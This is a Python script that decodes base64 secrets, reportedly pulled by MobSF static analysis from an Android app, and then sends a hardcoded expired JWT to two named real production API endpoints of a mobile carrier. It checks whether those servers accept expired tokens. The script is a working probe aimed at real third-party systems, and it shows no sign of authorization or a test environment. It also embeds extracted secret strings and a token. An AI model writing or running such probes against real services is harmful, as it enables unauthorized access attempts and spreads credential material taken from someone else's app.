#!/usr/bin/env python3
"""
Android Secret Decoder & JWT Expiration Tester
Decodes MobSF-found secrets and tests if the server accepts expired tokens.
"""

import base64
import requests
import json
from rich.console import Console

console = Console()

# Hardcoded secrets from user's MobSF list (B64 encoded samples)
B64_SECRETS = [
    "awkMAVUnFhQBCWsTRxFXJR4UAg4hCFobSCdXQV1OaUpFRhlrDhAfCiEIFAYPNh8=",
    "XDQOH0YXIgEFChY0WB8QADMSAUYQNwJDCgMyR0MKAzIRHgwCaDENAhYUHwEGHBgUHBwsMxIBGQ==",
    "FjUyPAsSJQMPNxdWJVwhMwAdO1kMJkEeDHYtAAwCJgQTKTk8AScCFSZRHBgNLCEyP18LJSVfISM3Gzg6E1NJPTx0WiQ4KgM2Ij1beA==",
    "PiAeJAkcbyEvBABvIiYXDyYSJhZZIR43RRg5ECoJGC0dJl9Z",
    "RmFpbHVyZSB0byBjb25uZWN0IG9yIGludmFsaWQgcmVzdWx0LiBQbGVhc2UgY29udGFjdCBJUFF1YWxpdHlTY29yZSBzdXBwb3J0IGlmIHRoaXMgZXJyb3IgcGVyc2lzdHMu",
    "Nz0vBzU/N2UFPyQ+IgYpPzwlWxsVEA4mCQkQBDQIBRYUORUVEh88FRg=",
    "dR4OP385ARY/I3UZHykiNwwbYyQyCAUhMTYyDSM+P1xYODU3HQ==",
    "KTAMHwMdNEUHGU8yCh0YCjIRUxkdcQwdAA49DBdWHTQWBhobf0UjGgowFhZWDD4LBxcMJUU6Jj4kBB8fGyg2EBkdNEUAAx8hCgECTzgDUwIHOBZTEx0jCgFWHzQXAB8cJRZd",
    "BQMkNC4lGCM1JWYKKzMnMx4vdGtuJQ5gayNcemp7dEU=",
    "P0A9EGZ+QnYaKyUSPVZoZEA6FSkhQG5UZioNOhFmaEJ2AD00B3ZOZGYNIQA0MRZ2CQ==",
    "EzkePQMbM1Q/CQA6EzwfGzgUYS0xFD8cPy0RMwEpLRs1DC0mHjUB",
    "DTYlCA4FPG8KBB41KAkSBTcvVCAvGwQpMjMPCDwoMwsVOzUp",
    "GxQ+JDYTHnQmPAgXMyUqExU0eBg5OR8FCiUtExAQJSkOFw0/",
    "OQw+AycxBnQBLSoPMwI7MQ00XxodIx4uGBAtFDQXCzYbJQ0=",
    "FBkHNS0cE003JwcaCjQxHBgNaQM2NCYUESo0LAYQJjI8Cw02NjcODTs=",
    "AaQoLYKqS72Xz13zBtHhCrc3sugF1RqsBDwPVGSIiPY="
]

EXPIRED_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MDc3NjY4MjQsIm5iZiI6MTUwNzc2NjgyNCwiZXhwIjoxNTk0MDgwNDI0LCJhdWQiOiJNaW50QXBwIiwiaXNzIjoiVUxUUkEifQ.r909IZmcavEhqvZO0td_-Ts_q27BBk4cCbFRXpDBQUM"

def decode_secrets():
    console.print("\n[bold cyan]🔓 Decoding Base64 Secrets from Android static analysis...[/bold cyan]")
    for secret in B64_SECRETS:
        try:
            decoded = base64.b64decode(secret)
            # Try to see if it's readable text
            try:
                text = decoded.decode('utf-8')
                console.print(f"  [green]Decoded (UTF-8):[/green] {text}")
            except:
                console.print(f"  [yellow]Decoded (Binary/Hex):[/yellow] {decoded.hex()}")
        except Exception as e:
            console.print(f"  [red]Failed to decode:[/red] {secret[:20]}...")

def test_expired_token():
    console.print("\n[bold red]🕒 Testing Expired Token Vulnerability...[/bold red]")
    # Endpoint derived from previous analysis
    urls = [
        "https://commerce-api.ultramobile.com/v1/mint",
        "https://mint-gateway.mintmobile.com/v1/mint/account"
    ]
    
    headers = {
        'Authorization': f'Bearer {EXPIRED_TOKEN}',
        'User-Agent': 'MintMobile/2.3.8 (Android; SDK 33)',
        'Content-Type': 'application/json'
    }
    
    for url in urls:
        console.print(f"  🔍 Testing URL: {url}")
        try:
            r = requests.get(url, headers=headers, timeout=10)
            console.print(f"  [yellow]Status:[/yellow] {r.status_code}")
            console.print(f"  [yellow]Response:[/yellow] {r.text[:200]}")
            
            if r.status_code == 200:
                console.print("  [bold red]🔥 VULNERABILITY CONFIRMED: SERVER ACCEPTS EXPIRED TOKENS![/bold red]")
            elif "expired" in r.text.lower():
                console.print("  [blue]ℹ️ Server correctly identified the token as expired.[/blue]")
            else:
                console.print("  [dim]Server rejected the token but did not explicitly mention expiration.[/dim]")
        except Exception as e:
            console.print(f"  [red]Error:[/red] {e}")

if __name__ == "__main__":
    decode_secrets()
    test_expired_token()
